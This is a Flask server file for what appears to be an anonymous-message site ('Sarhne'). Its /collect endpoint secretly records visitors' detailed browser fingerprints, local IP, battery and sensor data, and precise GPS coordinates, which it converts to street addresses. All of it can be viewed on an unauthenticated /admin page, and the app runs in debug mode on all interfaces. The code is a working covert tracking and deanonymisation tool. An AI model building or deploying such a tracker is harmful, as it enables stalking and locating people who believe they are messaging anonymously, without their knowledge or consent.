import sqlite3
import os
import json
import requests
from flask import Flask, render_template, request, jsonify, g

app = Flask(__name__)
app.secret_key = os.urandom(24)
DATABASE = 'sarhne_final.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.cursor().execute('''
            CREATE TABLE IF NOT EXISTS visitors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                action_type TEXT,
                message TEXT,
                ip_address TEXT,
                local_ip TEXT,
                ip_country TEXT,
                ip_city TEXT,
                ip_isp TEXT,
                ip_lat TEXT,
                ip_lon TEXT,
                exact_address TEXT,
                gps_accuracy TEXT,
                user_agent TEXT,
                browser_name TEXT,
                os_name TEXT,
                device_type TEXT,
                screen_resolution TEXT,
                color_depth TEXT,
                timezone TEXT,
                timezone_offset TEXT,
                sensor_data TEXT,
                social_media TEXT,
                fonts TEXT,
                language TEXT,
                languages_all TEXT,
                platform TEXT,
                cpu_cores TEXT,
                ram_gb TEXT,
                gpu_vendor TEXT,
                gpu_renderer TEXT,
                canvas_hash TEXT,
                webgl_hash TEXT,
                audio_hash TEXT,
                connection_type TEXT,
                connection_speed TEXT,
                battery_level TEXT,
                battery_charging TEXT,
                touch_support TEXT,
                cookie_enabled TEXT,
                do_not_track TEXT,
                ad_blocker TEXT,
                webdriver TEXT,
                plugins TEXT,
                referrer TEXT,
                page_url TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        db.commit()

init_db()

def reverse_geocode(lat, lon):
    """Convert Lat/Lon into a real-world address (village, street, city) using OpenStreetMap"""
    try:
        headers = {'User-Agent': 'SarhneCyberProject/1.0'}
        url = f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}"
        resp = requests.get(url, headers=headers, timeout=5)
        data = resp.json()
        if 'display_name' in data:
            return data['display_name']
    except Exception as e:
        print("Geocode error:", e)
    return "Unknown Location"

def get_ip_info(ip):
    """Use free ip-api.com to get location info from IP address (server-side)"""
    info = {'country': 'N/A', 'city': 'N/A', 'isp': 'N/A', 'lat': 'N/A', 'lon': 'N/A'}
    if ip == '127.0.0.1' or ip == '::1':
        # For localhost testing, try to get our public IP
        try:
            resp = requests.get('http://ip-api.com/json/', timeout=3)
            data = resp.json()
            if data.get('status') == 'success':
                info['country'] = data.get('country', 'N/A')
                info['city'] = data.get('city', 'N/A')
                info['isp'] = data.get('isp', 'N/A')
                info['lat'] = str(data.get('lat', 'N/A'))
                info['lon'] = str(data.get('lon', 'N/A'))
        except:
            pass
    else:
        try:
            resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
            data = resp.json()
            if data.get('status') == 'success':
                info['country'] = data.get('country', 'N/A')
                info['city'] = data.get('city', 'N/A')
                info['isp'] = data.get('isp', 'N/A')
                info['lat'] = str(data.get('lat', 'N/A'))
                info['lon'] = str(data.get('lon', 'N/A'))
        except:
            pass
    return info

def parse_user_agent(ua_string):
    """Simple UA parsing to extract browser and OS name"""
    browser = 'Unknown'
    os_name = 'Unknown'
    device = 'Desktop'
    
    ua = ua_string.lower()
    
    # Browser detection
    if 'edg/' in ua: browser = 'Microsoft Edge'
    elif 'chrome/' in ua and 'safari/' in ua: browser = 'Google Chrome'
    elif 'firefox/' in ua: browser = 'Mozilla Firefox'
    elif 'safari/' in ua: browser = 'Apple Safari'
    elif 'opera' in ua or 'opr/' in ua: browser = 'Opera'
    
    # OS detection
    if 'windows nt 10' in ua: os_name = 'Windows 10/11'
    elif 'windows nt' in ua: os_name = 'Windows'
    elif 'mac os x' in ua: os_name = 'macOS'
    elif 'android' in ua: os_name = 'Android'
    elif 'iphone' in ua or 'ipad' in ua: os_name = 'iOS'
    elif 'linux' in ua: os_name = 'Linux'
    
    # Device type
    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
        device = 'Mobile'
    elif 'ipad' in ua or 'tablet' in ua:
        device = 'Tablet'
    
    return browser, os_name, device

@app.route('/', methods=['GET', 'POST'])
def home():
    db = get_db()
    res = db.execute("SELECT COUNT(*) as count FROM visitors WHERE action_type='PAGE_VISIT'").fetchone()
    count = res['count'] if res else 2339
    
    # We always render home.html. AJAX handles the rest.
    return render_template('home.html', success=False, visits_count=count)
    
@app.route('/collect', methods=['POST'])
def collect():
    """Receives ALL fingerprint data from the browser via AJAX"""
    data = request.json or {}
    action = data.get('action_type', 'PAGE_VISIT')
    
    db = get_db()
    
    # 1. Provide a dedicated GPS Update endpoint block for accuracy tracking.
    if action == 'GPS_UPDATE':
        visitor_canvas = data.get('canvasHash', '')
        lat = data.get('lat')
        lon = data.get('lon')
        acc = data.get('acc')
        address = reverse_geocode(lat, lon)
        
        # We find the latest log for this canvasHash and update it with the true GPS
        db.execute('''
            UPDATE visitors 
            SET ip_lat = ?, ip_lon = ?, exact_address = ?, gps_accuracy = ? 
            WHERE id = (SELECT id FROM visitors WHERE canvas_hash = ? ORDER BY id DESC LIMIT 1)
        ''', (lat, lon, address, f"Within {acc} meters", visitor_canvas))
        db.commit()
        return jsonify({"status": "gps_updated"})

    # 2. Otherwise it's a PAGE_VISIT or MESSAGE_SENT
    message = data.get('message', '')
    
    # SERVER-SIDE: Get IP info Backup (always runs)
    ip = request.remote_addr
    ip_info = get_ip_info(ip)
    
    # Check if they sent GPS right away? usually unlikely unless pre-cached, but just in case
    lat = data.get('lat') or ip_info['lat']
    lon = data.get('lon') or ip_info['lon']
    address = "N/A"
    gps_acc = "N/A"
    
    if data.get('lat') and data.get('lon'):
        address = reverse_geocode(lat, lon)
        gps_acc = f"Within {data.get('acc', 'Unknown')} meters"
        
    # SERVER-SIDE: Parse User-Agent
    ua = request.user_agent.string
    browser, os_name, device = parse_user_agent(ua)
    
    db.execute('''
        INSERT INTO visitors (
            action_type, message, ip_address, local_ip, ip_country, ip_city, ip_isp, ip_lat, ip_lon, exact_address, gps_accuracy,
            user_agent, browser_name, os_name, device_type,
            screen_resolution, color_depth, timezone, timezone_offset, sensor_data, social_media, fonts, language, languages_all,
            platform, cpu_cores, ram_gb, gpu_vendor, gpu_renderer,
            canvas_hash, webgl_hash, audio_hash,
            connection_type, connection_speed, battery_level, battery_charging,
            touch_support, cookie_enabled, do_not_track, ad_blocker, webdriver,
            plugins, referrer, page_url
        ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
    ''', (
        action, message, ip, data.get('localIp', 'Unknown'), ip_info['country'], ip_info['city'], ip_info['isp'], lat, lon, address, gps_acc,
        ua, browser, os_name, device,
        data.get('screen', ''), data.get('colorDepth', ''), data.get('timezone', ''), data.get('timezoneOffset', ''), data.get('sensorData', ''),
        data.get('social', ''), data.get('fonts', ''),
        data.get('language', ''), data.get('languages', ''),
        data.get('platform', ''), data.get('cpuCores', ''), data.get('ram', ''),
        data.get('gpuVendor', ''), data.get('gpuRenderer', ''),
        data.get('canvasHash', ''), data.get('webglHash', ''), data.get('audioHash', ''),
        data.get('connectionType', ''), data.get('connectionSpeed', ''),
        data.get('batteryLevel', ''), data.get('batteryCharging', ''),
        data.get('touchSupport', ''), data.get('cookieEnabled', ''),
        data.get('doNotTrack', ''), data.get('adBlocker', ''), data.get('webdriver', ''),
        data.get('plugins', ''), data.get('referrer', ''), data.get('pageUrl', '')
    ))
    db.commit()
    return jsonify({"status": "ok"})

@app.route('/admin')
def admin():
    db = get_db()
    visitors = db.execute("SELECT * FROM visitors ORDER BY created_at DESC").fetchall()
    return render_template('admin.html', visitors=visitors)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
